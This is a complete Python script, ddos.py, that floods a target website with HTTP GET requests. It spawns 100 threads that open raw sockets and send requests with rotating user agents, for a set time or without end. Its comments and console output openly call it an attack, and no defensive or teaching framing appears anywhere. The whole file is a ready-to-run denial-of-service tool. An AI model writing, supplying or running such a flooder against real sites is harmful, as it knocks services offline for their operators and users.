#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ddos.py - Simple HTTP GET flooder (socket-based)
# Usage: python ddos.py <target_url>
# Example: python ddos.py https://example.com

import sys
import socket
import threading
import time
import random
from urllib.parse import urlparse

# Attack configuration
THREADS = 100           # Number of concurrent threads
DURATION = 60           # Attack duration in seconds (0 for infinite)
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36",
]

stop_flag = threading.Event()

def flood(target_host, target_port, path):
    """Send continuous HTTP GET requests."""
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((target_host, target_port))
            # Craft raw HTTP request
            user_agent = random.choice(USER_AGENTS)
            request = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {target_host}\r\n"
                f"User-Agent: {user_agent}\r\n"
                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                f"Accept-Language: en-US,en;q=0.5\r\n"
                f"Accept-Encoding: gzip, deflate\r\n"
                f"Connection: keep-alive\r\n"
                f"Cache-Control: no-cache\r\n"
                "\r\n"
            )
            sock.send(request.encode())
            sock.close()
        except:
            pass

def main():
    if len(sys.argv) != 2:
        print("Usage: python ddos.py <target_url>")
        sys.exit(1)

    url = sys.argv[1]
    if not url.startswith("http"):
        url = "http://" + url

    parsed = urlparse(url)
    target_host = parsed.hostname
    target_port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path if parsed.path else "/"

    print(f"[*] Target: {target_host}:{target_port}{path}")
    print(f"[*] Threads: {THREADS} | Duration: {DURATION}s (0 = infinite)")
    print("[*] Starting attack...")

    # Spawn threads
    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=flood, args=(target_host, target_port, path))
        t.daemon = True
        t.start()
        threads.append(t)

    # Run for specified duration or until user stops
    try:
        if DURATION > 0:
            time.sleep(DURATION)
            stop_flag.set()
        else:
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Interrupted. Stopping attack.")
        stop_flag.set()

    # Wait for threads to finish
    for t in threads:
        t.join(timeout=2)

    print("[*] Attack finished.")

if __name__ == "__main__":
    main()
